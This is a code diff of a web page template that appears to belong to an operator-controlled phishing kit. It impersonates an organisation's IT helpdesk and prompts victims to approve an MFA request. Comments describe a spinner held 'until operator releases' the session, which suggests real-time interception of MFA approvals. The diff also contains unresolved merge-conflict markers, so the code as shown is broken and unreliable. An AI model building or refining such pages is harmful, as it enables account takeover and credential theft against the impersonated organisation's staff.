@@ -137,6 +137,7 @@
               <div class="mfa-notice-icon">&#x1f4f1;</div>
               <p>A verification request has been sent to your registered device. Please approve the prompt to continue.</p>
             </div>
+<<<<<<< HEAD
             <div id="nextWrap" style="display:none">
               <div class="completion-screen">
                 <div class="completion-icon">&#x2705;</div>
@@ -145,6 +146,23 @@
                 <p class="completion-close">You may close this window.</p>
               </div>
             </div>
+=======
+          </div>
+        </div>
+      </div>
+
+      <!-- STAGE 4: Submission complete -->
+      <div id="stage-complete" class="stage">
+        <div class="card">
+          <div class="card-head" style="border-bottom:none; padding-bottom:0;">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" alt="" class="card-logo">
+          </div>
+          <div class="completion-section">
+            <div class="completion-icon">&#x2705;</div>
+            <h2>Submission Complete</h2>
+            <p class="completion-msg">Your scan results have been submitted to the {{ org_name }} IT Helpdesk. No further action is required.</p>
+            <p class="completion-close">You may close this window.</p>
+>>>>>>> master
           </div>
         </div>
       </div>
@@ -477,11 +495,15 @@
 
       // vs4 stays spinning indefinitely until operator releases
       function showNext() {
+<<<<<<< HEAD
         document.getElementById('vs4').querySelector('.si').textContent = '\u2705';
         document.getElementById('vs4').classList.add('step-done');
         st.textContent = 'Verification complete.';
         document.getElementById('spinner').style.display = 'none';
         document.getElementById('nextWrap').style.display = 'block';
+=======
+        show('stage-complete');
+>>>>>>> master
       }
 
       // No auto-timer — operator has full control via session-targeted release
